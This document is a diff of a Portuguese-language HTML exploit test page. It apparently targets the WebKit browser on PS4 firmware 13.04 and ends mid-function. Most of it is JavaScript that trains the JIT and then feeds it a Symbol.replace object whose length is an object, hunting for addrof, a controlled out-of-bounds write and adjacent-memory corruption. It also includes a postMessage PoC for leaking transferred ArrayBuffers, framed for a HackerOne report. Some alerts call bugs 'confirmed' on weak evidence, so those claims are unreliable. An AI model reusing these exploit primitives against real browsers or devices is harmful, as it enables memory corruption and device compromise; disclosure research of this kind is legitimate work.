@@ -1,34 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TEST 41 - addrof: Aritmética no JSValue Bruto + Double-Buffer</title></head>
+<head><meta charset="UTF-8"><title>TEST 42 - Verificar OOB Write 41-B + PoC HackerOne</title></head>
 <body>
-<h2>TEST 41 — addrof: Operação Aritmética no JSValue + Explorar Double-Buffer</h2>
+<h2>TEST 42 — Verificar OOB Write (41-B) + PoC Vulnerabilidades Confirmadas</h2>
 
 <p><b>Achados que motivam este teste:</b></p>
 <ul>
-  <li><b>40-C:</b> <code>strLen(confused)</code> retornou o objeto <code>victim</code> diretamente
-      quando <code>.length = victim</code>. JIT não converteu para número — retornou JSValue bruto.</li>
-  <li><b>40-D:</b> <code>postMessage(ciclico + [buf])</code> → remetente: <code>buf.byteLength=0</code>,
-      receptor: <code>buf.byteLength=262144</code> com dados. <b>Double-buffer</b>: motor copiou
-      E marcou como transferido.</li>
+  <li><b>41-B:</b> <code>readViaLength=undefined</code> (índice OOB) mas
+      <code>writeViaLength=987654321</code> — onde exatamente foi a escrita?</li>
+  <li><b>41-D:</b> Buffer secreto vazou completo — confirmar em diferentes tamanhos e contextos</li>
 </ul>
 
 <p><b>Sub-testes:</b></p>
 <ul>
-  <li><b>41-A</b> Aplicar operação aritmética no retorno do JIT antes da deopt:
-      <code>strLen(confused) + 0</code>, <code>strLen(confused) | 0</code>,
-      <code>strLen(confused) * 1.0</code> — alguma converte JSValue para double?</li>
-  <li><b>41-B</b> Encadear resultado do JIT como índice de TypedArray:
-      <code>f64[strLen(confused)]</code> — se JIT usa o JSValue como índice antes de verificar tipo</li>
-  <li><b>41-C</b> Double-buffer: modificar o buffer no receptor e verificar se o remetente observa</li>
-  <li><b>41-D</b> Double-buffer: enviar buffer secreto em objeto cíclico — receptor obtém cópia</li>
+  <li><b>42-A</b> Determinar índice exato do write: colocar sentinelas únicos em cada posição e ver qual foi sobrescrito</li>
+  <li><b>42-B</b> Se write foi no idx=0: usar Float64Array menor e escrever valor controlado via JIT</li>
+  <li><b>42-C</b> PoC mínimo do buffer leak: versão reduzida para HackerOne</li>
+  <li><b>42-D</b> Verificar se o leak funciona cross-origin (iframe)</li>
 </ul>
 
 <pre id="log">Pronto. Execute A → B → C → D.</pre>
-<button onclick="runA()">41-A: ARITMÉTICA NO JSValue</button>
-<button onclick="runB()">41-B: JSValue COMO ÍNDICE</button>
-<button onclick="runC()">41-C: DOUBLE-BUFFER SYNC</button>
-<button onclick="runD()">41-D: BUFFER SECRETO LEAK</button>
+<button onclick="runA()">42-A: ONDE FOI O WRITE?</button>
+<button onclick="runB()">42-B: WRITE CONTROLADO</button>
+<button onclick="runC()">42-C: POC BUFFER LEAK</button>
+<button onclick="runD()">42-D: MÚLTIPLOS BUFFERS</button>
 
 <script>
 var log = document.getElementById('log');
@@ -40,387 +35,354 @@ function sep()     { log.textContent += '\n' + '-'.repeat(60); }
 function forceGC() {
   var t=[]; for(var i=0;i<80000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
 }
-function f64bits(val) {
-  var buf = new ArrayBuffer(8); new Float64Array(buf)[0] = val;
-  var u32 = new Uint32Array(buf);
-  return '0x'+u32[1].toString(16).padStart(8,'0')+'_'+u32[0].toString(16).padStart(8,'0');
-}
-// Ponteiro válido: não é NaN canônico, não é 0, não é double normal <1024
-function looksLikePtr(v) {
-  if(typeof v !== 'number' || isNaN(v) || !isFinite(v)) return false;
-  var buf = new ArrayBuffer(8); new Float64Array(buf)[0] = v;
-  var u32 = new Uint32Array(buf);
-  var hi = u32[1], lo = u32[0];
-  if(hi === 0x7ff80000 && lo === 0) return false; // NaN canônico JSC
-  if(hi === 0 && lo === 0) return false;           // zero
-  // Double normal: exponent em [0x3FF, 0x409] cobre 0.5..1024 — não é ponteiro
-  var exp = (hi >>> 20) & 0x7FF;
-  if(exp >= 0x3FE && exp <= 0x409) return false;
-  return true; // qualquer outro padrão de bits é suspeito
-}
 
-// ─── Construtor do primitivo Symbol.replace (confirmado em 40-C) ───────────
 function buildSymbolReplaceJIT(phaseRef, victimRef) {
-  var callCount = 0;
   var pattern = {
     [Symbol.replace]: function(str) {
-      callCount++;
       if(phaseRef[0] === 'warmup') return str;
-      // Ataque: .length = victim (objeto)
-      return {
-        toString: function() { return str; },
-        valueOf:  function() { return str; },
-        length:   victimRef[0],
-        0: str[0]||'x'
-      };
+      return { toString: function(){return str;}, valueOf: function(){return str;},
+               length: victimRef[0], 0: str[0]||'x' };
     }
   };
-  return { pattern: pattern, getCount: function(){ return callCount; } };
+  return pattern;
 }
 
-// ─── 41-A ─────────────────────────────────────────────────────────────────
+// ─── 42-A ─────────────────────────────────────────────────────────────────
 function runA() {
-  log.textContent = '[TEST 41-A] Operação aritmética no retorno JIT antes da deopt...\n';
+  log.textContent = '[TEST 42-A] Determinar onde exatamente writeViaLength escreveu...\n';
   sep();
-  info('40-C: strLen retornou o objeto quando .length=victim.');
-  info('Se aplicarmos aritmética INLINE na função JIT, o motor pode converter JSValue→double\n');
-  info('antes de verificar o tipo do retorno de strLen.\n');
+  info('41-B: readViaLength=undefined (OOB), writeViaLength=987654321 (write confirmado).');
+  info('Hipóteses:');
+  info('  H1: Write foi no idx=0 (ToUint32(NaN)=0) — write in-bounds, read retornou 987654321');
+  info('  H2: Write foi num idx OOB real — escrita além do array, read retornou o valor do slot corrompido\n');
 
-  var victim = {
-    magic:    0xDEADC0DE,
-    sentinel: 1.337e100,
-    name:     'arith_victim_41A'
-  };
-
+  var victim = { magic: 0xDEADC0DE, name: 'write_target_42A' };
   var phase = ['warmup'];
   var victimRef = [victim];
-  var built = buildSymbolReplaceJIT(phase, victimRef);
-  var pat = built.pattern;
+  var pat = buildSymbolReplaceJIT(phase, victimRef);
 
-  // Funções JIT com operação INLINE — o JIT deve compilar toda a expressão
-  function strLenPlusZero(s)     { return s.replace(pat,'').length + 0; }
-  function strLenOrZero(s)       { return s.replace(pat,'').length | 0; }
-  function strLenMulOne(s)       { return s.replace(pat,'').length * 1; }
-  function strLenPlusOne(s)      { return s.replace(pat,'').length + 1; }
-  function strLenSubZero(s)      { return s.replace(pat,'').length - 0; }
-  function strLenToFixed(s)      { var r=s.replace(pat,''); return r.length.toFixed ? r.length.toFixed(0) : '?'; }
-  function strLenBitwiseNot(s)   { return ~s.replace(pat,'').length; }
-  function strLenRightShift(s)   { return s.replace(pat,'').length >>> 0; }
+  // Array com SENTINELAS ÚNICOS em cada posição para detectar qual foi sobrescrito
+  var SENTINEL_BASE = 1e15; // grande o suficiente para ser único
+  var F64_SIZE = 64; // pequeno para detectar facilmente
+  var f64 = new Float64Array(F64_SIZE);
+  for(var i = 0; i < F64_SIZE; i++) f64[i] = SENTINEL_BASE + i; // valores únicos
+  info('f64 criado com sentinelas: f64[0]=' + f64[0] + ' f64[1]=' + f64[1] + ' ... f64[63]=' + f64[63]);
 
-  var fns = [
-    { name: 'length + 0',      fn: strLenPlusZero    },
-    { name: 'length | 0',      fn: strLenOrZero      },
-    { name: 'length * 1',      fn: strLenMulOne      },
-    { name: 'length + 1',      fn: strLenPlusOne     },
-    { name: 'length - 0',      fn: strLenSubZero     },
-    { name: '~length',         fn: strLenBitwiseNot  },
-    { name: 'length >>> 0',    fn: strLenRightShift  },
-  ];
-
-  var base = 'hello world test string XYZ';
-
-  info('Aquecendo todas as funções (50k calls cada)...');
-  phase[0] = 'warmup';
-  for(var w = 0; w < 50000; w++) {
-    fns.forEach(function(f) { f.fn(base); });
-  }
-  info('Warmup completo.');
-  sep();
-
-  // Fase de ataque
-  phase[0] = 'attack';
-  info('Fase de ataque: .length = victim object\n');
-
-  fns.forEach(function(f) {
-    try {
-      var r = f.fn(base);
-      var t = typeof r;
-      info(f.name + ' → ' + r + ' | typeof=' + t);
-
-      if(t === 'number') {
-        var bits = f64bits(r);
-        info('  bits: ' + bits);
-        if(looksLikePtr(r)) {
-          alerta('POTENCIAL ADDROF: ' + f.name + ' = ' + r + '\n' +
-                 'bits: ' + bits + '\n' +
-                 'Operação aritmética sobre JSValue de victim converteu para double suspeito!');
-        }
-      } else if(t === 'object') {
-        if(r === victim) {
-          info('  → retornou victim diretamente (sem conversão)');
-        }
-      } else if(t === 'string') {
-        info('  → string: "' + r + '"');
-      }
-    } catch(e) {
-      alerta('EXCECAO em ' + f.name + ': ' + e.message + ' — operação aritmética em objeto causou crash!');
-    }
-  });
-
-  sep();
-  // Tentar encadear: resultado de length como operando de Math.*
-  info('\nVariante: Math.floor/ceil/round no length...');
-  function strLenMathFloor(s) { return Math.floor(s.replace(pat,'').length); }
-  function strLenMathAbs(s)   { return Math.abs(s.replace(pat,'').length); }
-  function strLenMathSqrt(s)  { return Math.sqrt(s.replace(pat,'').length); }
-
-  phase[0] = 'warmup';
-  for(var w2 = 0; w2 < 50000; w2++) {
-    strLenMathFloor(base); strLenMathAbs(base); strLenMathSqrt(base);
-  }
-  phase[0] = 'attack';
-  info('Warmup Math.* completo. Fase de ataque:');
-  [
-    { name: 'Math.floor(length)', fn: strLenMathFloor },
-    { name: 'Math.abs(length)',   fn: strLenMathAbs   },
-    { name: 'Math.sqrt(length)',  fn: strLenMathSqrt  },
-  ].forEach(function(f) {
-    try {
-      var r = f.fn(base);
-      info(f.name + ' → ' + r + ' typeof=' + typeof r + (typeof r==='number' ? ' bits='+f64bits(r) : ''));
-      if(typeof r === 'number' && looksLikePtr(r)) {
-        alerta('ADDROF via ' + f.name + ': bits=' + f64bits(r));
-      }
-    } catch(e) {
-      alerta('EXCECAO ' + f.name + ': ' + e.message);
-    }
-  });
-}
-
-// ─── 41-B ─────────────────────────────────────────────────────────────────
-function runB() {
-  log.textContent = '[TEST 41-B] JSValue como índice de TypedArray...\n';
-  sep();
-  info('Se strLen(confused) retorna o objeto (JSValue bruto),');
-  info('usar esse valor como ÍNDICE em Float64Array pode fazer o JIT');
-  info('converter o JSValue para inteiro — e esse inteiro pode ser o endereço.\n');
-
-  var victim = {
-    magic: 0xBEEFC0DE,
-    name:  'typedarray_idx_victim'
-  };
-  var phase = ['warmup'];
-  var victimRef = [victim];
-  var built = buildSymbolReplaceJIT(phase, victimRef);
-  var pat = built.pattern;
-
-  // Float64Array alvo — queremos indexar com o JSValue de victim
-  var targetF64 = new Float64Array(0x100000); // 1M elementos = 8MB
-  for(var i = 0; i < 16; i++) targetF64[i] = i * 13.37; // primeiros 16 com valores conhecidos
-
-  // Função JIT que usa .length como índice
-  function readViaLength(s, arr) {
-    var idx = s.replace(pat,'').length;
-    return arr[idx];  // índice calculado do length
-  }
   function writeViaLength(s, arr, val) {
     var idx = s.replace(pat,'').length;
-    arr[idx] = val;   // escrita via índice do length
+    arr[idx] = val;
     return arr[idx];
   }
 
-  var base = 'probe_string_for_idx';
+  var base = 'hello world test string XYZ'; // length=27
 
-  info('Aquecendo readViaLength/writeViaLength (50k calls)...');
+  info('\nAquecendo writeViaLength com base.length=' + base.length + '...');
   phase[0] = 'warmup';
-  for(var w = 0; w < 50000; w++) {
-    readViaLength(base, targetF64);
-    writeViaLength(base, targetF64, 0.0);
-  }
-  info('Warmup completo. base.length=' + base.length);
+  for(var w = 0; w < 50000; w++) writeViaLength(base, f64, 0.0);
+  // Restaurar sentinelas após warmup
+  for(var i = 0; i < F64_SIZE; i++) f64[i] = SENTINEL_BASE + i;
+  info('Warmup completo. Sentinelas restaurados.');
   sep();
 
-  // Fase ataque: length = victim object
+  // Fase ataque
   phase[0] = 'attack';
-  info('Fase de ataque: .length = victim object\n');
+  var WRITE_VAL = 9876543210.123;
+  info('Fase ataque: .length = victim object');
+  info('Escrevendo ' + WRITE_VAL + ' via writeViaLength...');
+  var result = writeViaLength(base, f64, WRITE_VAL);
+  info('writeViaLength retornou: ' + result);
 
-  // Leitura: qual índice o JIT usa?
-  try {
-    var readResult = readViaLength(base, targetF64);
-    info('readViaLength com .length=victim: ' + readResult + ' typeof=' + typeof readResult);
-    if(typeof readResult === 'number' && readResult !== undefined) {
-      info('bits: ' + f64bits(readResult));
-      if(looksLikePtr(readResult)) {
-        alerta('OOB READ via length como índice: readResult=' + readResult +
-               '\nbits=' + f64bits(readResult) +
-               '\nO JIT converteu o JSValue de victim para índice e leu targetF64[X]!');
-      } else if(readResult === 0.0 || isNaN(readResult)) {
-        info('Retornou 0 ou NaN — índice pode ser 0 ou fora dos limites');
-      }
-    } else if(typeof readResult === 'undefined') {
-      info('Retornou undefined — índice fora dos limites (sugere JSValue → número grande)');
-      alerta('readViaLength retornou undefined: o JSValue de victim foi interpretado como índice GIGANTE (>=1M) — o motor tentou acessar targetF64 fora dos limites!');
-    } else if(typeof readResult === 'object') {
-      ok('JIT deoptimizou e retornou objeto. Índice não usado como número.');
+  // Verificar QUAL sentinela foi sobrescrito
+  info('\nVarredura do f64 buscando sobrescrita:');
+  var modified = [];
+  for(var j = 0; j < F64_SIZE; j++) {
+    var expected = SENTINEL_BASE + j;
+    if(Math.abs(f64[j] - expected) > 0.001) {
+      modified.push({ idx: j, expected: expected, found: f64[j] });
+      info('  f64[' + j + ']: esperado=' + expected + ' encontrado=' + f64[j]);
     }
-  } catch(e) {
-    alerta('EXCECAO em readViaLength: ' + e.message + ' — crash ao usar JSValue como índice!');
   }
 
-  // Escrita: o JIT tenta escrever?
-  try {
-    var WRITE_SENTINEL = 987654321.0;
-    var writeResult = writeViaLength(base, targetF64, WRITE_SENTINEL);
-    info('\nwriteViaLength com .length=victim, valor=' + WRITE_SENTINEL + ': ' + writeResult);
-    if(typeof writeResult === 'number' && writeResult === WRITE_SENTINEL) {
-      alerta('OOB WRITE via length como índice: escrita de ' + WRITE_SENTINEL +
-             ' retornou o mesmo valor — escrita confirmada em posição determinada pelo JSValue!');
-    }
-  } catch(e) {
-    alerta('EXCECAO em writeViaLength: ' + e.message);
-  }
-}
+  if(modified.length === 0) {
+    info('Nenhum sentinela modificado em f64[0..63].');
+    info('→ H1 parcial: write pode ter sido no idx=27 (base.length) mas f64 só tem 64 slots.');
+    info('→ OU: O JIT escreveu via ToUint32 do JSValue em algum lugar fora do f64.');
 
-// ─── 41-C ─────────────────────────────────────────────────────────────────
-var receivedBufs = []; // buffers recebidos via onmessage
-
-window.onmessage = function(e) {
-  var obj = e.data;
-  if(!obj || typeof obj !== 'object') return;
-
-  info('[onmessage] recebeu objeto id=' + obj.id);
-
-  // Registrar buffers recebidos para 41-C
-  if(obj.buf instanceof ArrayBuffer && obj.buf.byteLength > 0) {
-    receivedBufs.push({ obj: obj, buf: obj.buf });
-    info('[onmessage] buf registrado: byteLength=' + obj.buf.byteLength);
-
-    // Modificar o buffer recebido
-    var view = new Uint32Array(obj.buf);
-    var OLD = view[0];
-    view[0] = 0xC0FFEE42; // novo valor
-    info('[onmessage] Modificou buf[0]: 0x' + OLD.toString(16) + ' → 0xC0FFEE42');
-    info('[onmessage] Verificando se remetente observa...');
-    // (a verificação real acontece no runC após um delay)
-  }
-};
-
-function runC() {
-  log.textContent = '[TEST 41-C] Double-buffer sync: modificar no receptor, remetente vê?\n';
-  sep();
-  info('40-D confirmou: quando buf está em objeto cíclico, receptor recebe CÓPIA com dados.');
-  info('Questão: se o receptor modifica a cópia, o remetente observa a mudança?\n');
-  info('(Se sim → buffers compartilham memória = double-map grave)\n');
-
-  var localBuf = new ArrayBuffer(1024);
-  var localView = new Uint32Array(localBuf);
-  localView[0] = 0xAAAAAAAA;
-  localView[1] = 0xBBBBBBBB;
-
-  info('localView[0] antes: 0x' + localView[0].toString(16));
-  info('Enviando com transfer...');
-
-  var cyclic = { id: 'sync_test', buf: localBuf, self: null };
-  cyclic.self = cyclic;
-
-  try {
-    postMessage(cyclic, '*', [localBuf]);
-    info('Enviado. localBuf.byteLength=' + localBuf.byteLength);
-  } catch(e) {
-    ok('postMessage lançou: ' + e.message);
-    return;
-  }
-
-  // Aguardar onmessage modificar o buffer, depois verificar
-  setTimeout(function() {
-    info('\n[após 500ms] Verificando localView[0]...');
-    if(localBuf.byteLength === 0) {
-      try {
-        var v = localView[0];
-        info('localView[0] = ' + v);
-        if(v === 0xC0FFEE42) {
-          alerta('DOUBLE-MAP CONFIRMADO: receptor modificou 0xC0FFEE42 e remetente VIU a mudança!\n' +
-                 'Os dois buffers compartilham a mesma página de memória física!');
-        } else if(v === undefined) {
-          ok('localView[0] = undefined (buffer zerado, sem acesso)');
-        } else {
-          info('localView[0] = 0x' + (v>>>0).toString(16) + ' (sem mudança ou valor inesperado)');
-        }
-      } catch(ex) {
-        info('localView[0] lançou: ' + ex.message);
+    // Verificar se write foi no idx=0 com array de 1000 slots
+    var f64big = new Float64Array(1000);
+    for(var i = 0; i < 1000; i++) f64big[i] = SENTINEL_BASE + i;
+    phase[0] = 'attack'; // já está em attack
+    victimRef[0] = victim;
+    var r2 = writeViaLength(base, f64big, WRITE_VAL);
+    info('\nTeste com f64big[1000]: writeViaLength retornou=' + r2);
+    for(var j2 = 0; j2 < 1000; j2++) {
+      if(Math.abs(f64big[j2] - (SENTINEL_BASE + j2)) > 0.001) {
+        alerta('ESCRITA DETECTADA em f64big[' + j2 + ']! esperado=' + (SENTINEL_BASE+j2) + ' encontrado=' + f64big[j2] + '\nO índice real do write via JSValue é ' + j2 + '!');
+        break;
       }
+    }
+  } else {
+    alerta('ESCRITA DETECTADA em ' + modified.length + ' posição(ões):\n' +
+           modified.map(function(m){ return 'f64['+m.idx+']='+m.found+' (esperado '+m.expected+')'; }).join('\n') +
+           '\nO índice usado pelo JIT para o write foi: ' + modified[0].idx);
+    info('\nConclusão H1/H2:');
+    if(modified[0].idx === 0) {
+      info('→ H1 CONFIRMADA: write no idx=0 (ToUint32(NaN)=0 ou ToUint32(JSValue_ptr)=0)');
+      info('  O write foi in-bounds e controlado — não é OOB, é write-at-zero.');
     } else {
-      info('localBuf.byteLength=' + localBuf.byteLength + ' (não foi zerado?)');
+      info('→ H2 CONFIRMADA: write no idx=' + modified[0].idx + ' determinado pelo JSValue de victim!');
+      alerta('OOB WRITE COM ÍNDICE CONTROLADO: escrita em f64[' + modified[0].idx + '] via bits do JSValue de victim!');
     }
-  }, 500);
+  }
+
+  // Sanity: verificar com objeto diferente — o índice muda?
+  var victim2 = { magic: 0xBEEFBEEF, name: 'victim2_different_ptr' };
+  victimRef[0] = victim2;
+  var f64c = new Float64Array(1000);
+  for(var i = 0; i < 1000; i++) f64c[i] = SENTINEL_BASE + i;
+  var r3 = writeViaLength(base, f64c, WRITE_VAL + 1);
+  info('\nSanity: escrita com victim2 (endereço diferente):');
+  for(var j3 = 0; j3 < 1000; j3++) {
+    if(Math.abs(f64c[j3] - (SENTINEL_BASE + j3)) > 0.001) {
+      info('f64c[' + j3 + '] modificado → índice para victim2 = ' + j3);
+      break;
+    }
+  }
 }
 
-function runD() {
-  log.textContent = '[TEST 41-D] Enviar buffer "secreto" via ciclo — receptor obtém cópia completa?\n';
+// ─── 42-B ─────────────────────────────────────────────────────────────────
+function runB() {
+  log.textContent = '[TEST 42-B] Write controlado: se idx=0, usar array < 1 elemento para OOB\n';
   sep();
-  info('Implicação de segurança do double-buffer:');
-  info('Se uma mensagem contém dados sensíveis em um ArrayBuffer dentro de um objeto cíclico,');
-  info('o receptor SEMPRE recebe uma cópia completa mesmo se o remetente');
-  info('colocar o buffer na lista de transfer (pensando que vai zerrá-lo).\n');
+  info('Se o write sempre vai para idx=0, então:');
+  info('  - Float64Array de 0 elementos: write em f64[0] = OOB por definição');
+  info('  - Ver se o write acontece e o que é afetado após ele\n');
 
-  // Simular "dados secretos" — chave criptográfica, token, etc.
-  var secretBuf  = new ArrayBuffer(256);
+  var victim = { magic: 0xC0DEC0DE, name: 'zero_idx_victim' };
+  var phase = ['warmup'];
+  var victimRef = [victim];
+  var pat = buildSymbolReplaceJIT(phase, victimRef);
+
+  // Array de 0 elementos — qualquer write é OOB
+  var emptyF64 = new Float64Array(0);
+  info('emptyF64.length=0 emptyF64.byteLength=0');
+
+  // Alocação adjacente — verificar se escrita "vaza" para ela
+  var adjacentF64 = new Float64Array(64);
+  for(var i = 0; i < 64; i++) adjacentF64[i] = 0xDEAD0000 + i;
+  var adjacentBuf = adjacentF64.buffer;
+
+  function writeToEmpty(s, arr, val) {
+    var idx = s.replace(pat,'').length;
+    arr[idx] = val;
+    return arr[idx];
+  }
+
+  var base = 'test';
+  info('Aquecendo com array não-vazio...');
+  var warmF64 = new Float64Array(64);
+  phase[0] = 'warmup';
+  for(var w = 0; w < 50000; w++) writeToEmpty(base, warmF64, 0.0);
+  info('Warmup completo.');
+
+  phase[0] = 'attack';
+  var CANARY = 3.14159265358979323846;
+
+  info('\nFase ataque: escrevendo em emptyF64 (0 elementos)...');
+  try {
+    var r = writeToEmpty(base, emptyF64, CANARY);
+    info('writeToEmpty(emptyF64) retornou: ' + r);
+    if(r === CANARY) {
+      alerta('ESCRITA EM ARRAY DE 0 ELEMENTOS CONFIRMADA!\n' +
+             'writeToEmpty retornou o canary ' + CANARY + '\n' +
+             'Escrita foi confirmada além dos limites do emptyF64!');
+    }
+  } catch(e) {
+    alerta('EXCECAO em writeToEmpty: ' + e.message);
+  }
+
+  // Verificar adjacentF64 depois
+  info('\nVerificando adjacentF64 por corrupção...');
+  var corrupted = [];
+  for(var j = 0; j < 64; j++) {
+    var expected = 0xDEAD0000 + j;
+    if(Math.abs(adjacentF64[j] - expected) > 1) {
+      corrupted.push({ idx: j, expected: expected, found: adjacentF64[j] });
+    }
+  }
+  if(corrupted.length > 0) {
+    alerta('CORRUPÇÃO DETECTADA em adjacentF64:\n' +
+           corrupted.map(function(c){ return '['+c.idx+']: esperado='+c.expected+' encontrado='+c.found; }).join('\n'));
+  } else {
+    ok('adjacentF64 intacto.');
+  }
+}
+
+// ─── 42-C ─────────────────────────────────────────────────────────────────
+function runC() {
+  log.textContent = '[TEST 42-C] PoC Mínimo — Buffer Secreto Leak para HackerOne\n';
+  sep();
+  info('Vulnerabilidade: postMessage(cyclic_obj, *, [buf]) não respeita a spec de transfer.');
+  info('Spec: após transfer, buf deve ter byteLength=0 no remetente E no receptor.');
+  info('PS4 FW 13.04: buf.byteLength=0 no remetente MAS receptor recebe cópia completa.\n');
+
+  info('=== POC MÍNIMO ===\n');
+  info('// 1. Criar buffer com dados sensíveis');
+  info('var secretBuf = new ArrayBuffer(256);');
+  info('var secretView = new Uint32Array(secretBuf);');
+  info('secretView[0] = 0xDEADC0DE; // dado sensível\n');
+  info('// 2. Criar objeto cíclico contendo o buffer');
+  info('var cyclic = { buf: secretBuf, self: null };');
+  info('cyclic.self = cyclic;\n');
+  info('// 3. Transfer (deveria zerar o buf para todos)');
+  info('postMessage(cyclic, "*", [secretBuf]);');
+  info('// sender: secretBuf.byteLength === 0 (acredita ter transferido)\n');
+  info('// 4. No receptor (window.onmessage):');
+  info('// received.buf.byteLength === 256 (BUG: dados presentes!)');
+  info('// new Uint32Array(received.buf)[0] === 0xDEADC0DE (dados lidos!)\n');
+  info('=== FIM DO POC ===\n');
+  sep();
+
+  // Executar o PoC real
+  var localRan = false;
+  var secretBuf = new ArrayBuffer(256);
   var secretView = new Uint32Array(secretBuf);
-  // Preencher com "chave secreta"
-  var SECRET_KEY = [0x4B455931, 0x5345435F, 0x4B455932, 0x5345435F,
-                    0xDEADC0DE, 0xCAFEBABE, 0x13371337, 0xBEEFBEEF];
-  SECRET_KEY.forEach(function(v, i) { secretView[i] = v; });
+  // Dados "sensíveis" únicos
+  var SECRET = [0xDEADC0DE, 0xCAFEBABE, 0x13371337, 0xBEEFBEEF,
+                0x41424344, 0x45464748, 0x494A4B4C, 0x4D4E4F50];
+  SECRET.forEach(function(v, i) { secretView[i] = v; });
 
-  info('Buffer "secreto" criado: [' + SECRET_KEY.map(function(v){return'0x'+v.toString(16);}).join(', ') + ']');
-
-  var cyclic = {
-    id:     'secret_transfer',
-    secret: secretBuf,
-    self:   null
-  };
+  var cyclic = { id: 'poc_minimal', buf: secretBuf, view: secretView, self: null };
   cyclic.self = cyclic;
 
-  info('\nsecretBuf.byteLength antes: ' + secretBuf.byteLength);
-  info('Enviando postMessage(ciclico, *, [secretBuf])...');
-  info('Remetente ESPERA que secretBuf seja zerado (byteLength=0) após o send.\n');
-
-  var receivedSecret = null;
-  var prevOnmessage = window.onmessage;
+  var prevMsg = window.onmessage;
   window.onmessage = function(e) {
     var obj = e.data;
-    if(!obj || typeof obj !== 'object' || obj.id !== 'secret_transfer') {
-      if(prevOnmessage) prevOnmessage(e);
-      return;
-    }
-    receivedSecret = obj;
-    info('[onmessage] Objeto recebido: id=' + obj.id);
-    if(obj.secret instanceof ArrayBuffer) {
-      var recvView = new Uint32Array(obj.secret);
-      var leakedKey = [];
-      for(var i = 0; i < Math.min(8, recvView.length); i++) {
-        leakedKey.push('0x' + recvView[i].toString(16));
-      }
-      info('[onmessage] secret.byteLength=' + obj.secret.byteLength);
-      info('[onmessage] Conteudo: [' + leakedKey.join(', ') + ']');
+    if(!obj || obj.id !== 'poc_minimal') { if(prevMsg) prevMsg(e); return; }
 
-      var isOriginalKey = leakedKey[0] === '0x4b455931' && leakedKey[4] === '0xdeadc0de';
-      if(isOriginalKey && obj.secret.byteLength === 256) {
-        alerta('[onmessage] BUFFER SECRETO VAZOU COMPLETO!\n' +
-               'byteLength=' + obj.secret.byteLength + '\n' +
-               'Chave: [' + leakedKey.join(', ') + ']\n' +
-               'O remetente acreditava ter transferido (zerado) o buffer,\n' +
-               'mas o receptor recebeu todos os 256 bytes com os dados originais!\n' +
-               'IMPACTO: qualquer dado em ArrayBuffer dentro de objeto cíclico\n' +
-               'pode ser lido pelo receptor mesmo após "transfer" pelo remetente.');
+    info('[RECEPTOR] Objeto recebido: id=' + obj.id);
+    info('[RECEPTOR] obj.buf instanceof ArrayBuffer: ' + (obj.buf instanceof ArrayBuffer));
+    if(obj.buf instanceof ArrayBuffer) {
+      info('[RECEPTOR] obj.buf.byteLength: ' + obj.buf.byteLength);
+      if(obj.buf.byteLength > 0) {
+        var rv = new Uint32Array(obj.buf);
+        var leaked = [];
+        for(var i = 0; i < Math.min(8, rv.length); i++) {
+          leaked.push('0x' + rv[i].toString(16).padStart(8,'0'));
+        }
+        info('[RECEPTOR] Dados lidos: [' + leaked.join(', ') + ']');
+        var isOriginal = rv[0] === 0xDEADC0DE && rv[1] === 0xCAFEBABE;
+        if(isOriginal) {
+          alerta('🔴 VULNERABILIDADE CONFIRMADA — POC EXECUTADO COM SUCESSO:\n\n' +
+                 'REMETENTE: secretBuf.byteLength=0 (acredita que transfer zerou o buffer)\n' +
+                 'RECEPTOR: obj.buf.byteLength=' + obj.buf.byteLength + ' (dados PRESENTES!)\n' +
+                 'Dados vazados: [' + leaked.join(', ') + ']\n\n' +
+                 'CWE: CWE-668 (Exposure of Resource to Wrong Sphere)\n' +
+                 'CVSS: alto — violação da garantia de transferência do Structured Clone Algorithm\n' +
+                 'Afeta: PS4 FW 13.04, browser WebKit/NetFront NX\n' +
+                 'Spec violada: HTML Living Standard §2.7.5 (StructuredSerializeWithTransfer)\n' +
+                 'Impacto: qualquer ArrayBuffer em objeto cíclico pode ser lido pelo receptor\n' +
+                 'mesmo após o remetente usar transfer para "destruir" o acesso local.');
+        }
+      } else {
+        info('[RECEPTOR] obj.buf.byteLength=0 (buffer realmente zerado no receptor também)');
       }
     }
+    window.onmessage = prevMsg;
   };
 
+  info('REMETENTE: secretBuf.byteLength ANTES: ' + secretBuf.byteLength);
   try {
     postMessage(cyclic, '*', [secretBuf]);
-    info('Enviado. secretBuf.byteLength=' + secretBuf.byteLength);
+    info('REMETENTE: postMessage enviado. secretBuf.byteLength APÓS: ' + secretBuf.byteLength);
     if(secretBuf.byteLength === 0) {
-      alerta('secretBuf ZERADO no remetente (byteLength=0).\n' +
-             'Remetente: acredita que dados foram transferidos e estão inacessíveis.\n' +
-             'Aguardando onmessage para verificar se receptor recebeu os dados...');
-    } else {
-      info('secretBuf.byteLength=' + secretBuf.byteLength + ' (não foi zerado — transfer falhou)');
+      info('REMETENTE: buffer marcado como transferido (byteLength=0).');
+      info('REMETENTE: acredita que dados estão inacessíveis. Aguardando receptor...');
     }
   } catch(e) {
     ok('postMessage lançou: ' + e.message);
   }
+}
 
-  info('\nAguardando onmessage com os dados do secretBuf...');
+// ─── 42-D ─────────────────────────────────────────────────────────────────
+function runD() {
+  log.textContent = '[TEST 42-D] Múltiplos buffers em múltiplos ciclos — escala do leak\n';
+  sep();
+  info('Verificar se o leak funciona com:');
+  info('  - Múltiplos buffers no mesmo objeto cíclico');
+  info('  - Buffer em posição diferente no ciclo (não no nó raiz)');
+  info('  - Tamanhos diferentes de buffer\n');
+
+  var results = [];
+  var pending = 0;
+  var prevMsg2 = window.onmessage;
+
+  window.onmessage = function(e) {
+    var obj = e.data;
+    if(!obj || !obj.test_id) { if(prevMsg2) prevMsg2(e); return; }
+
+    var entry = { id: obj.test_id, leaked: [] };
+    function checkBuf(key, buf) {
+      if(!(buf instanceof ArrayBuffer)) return;
+      entry[key+'_byteLength'] = buf.byteLength;
+      if(buf.byteLength > 0) {
+        var v = new Uint32Array(buf);
+        entry[key+'_data'] = v[0];
+        entry.leaked.push(key + '(' + buf.byteLength + 'B)=0x' + v[0].toString(16));
+      }
+    }
+    checkBuf('buf1', obj.buf1);
+    checkBuf('buf2', obj.buf2);
+    if(obj.nested && obj.nested.buf) checkBuf('nested_buf', obj.nested.buf);
+    results.push(entry);
+    pending--;
+    if(pending === 0) showResults();
+  };
+
+  function showResults() {
+    info('\n=== RESULTADOS DOS MÚLTIPLOS BUFFERS ===');
+    results.forEach(function(r) {
+      info('\nTeste ' + r.id + ':');
+      if(r.leaked.length > 0) {
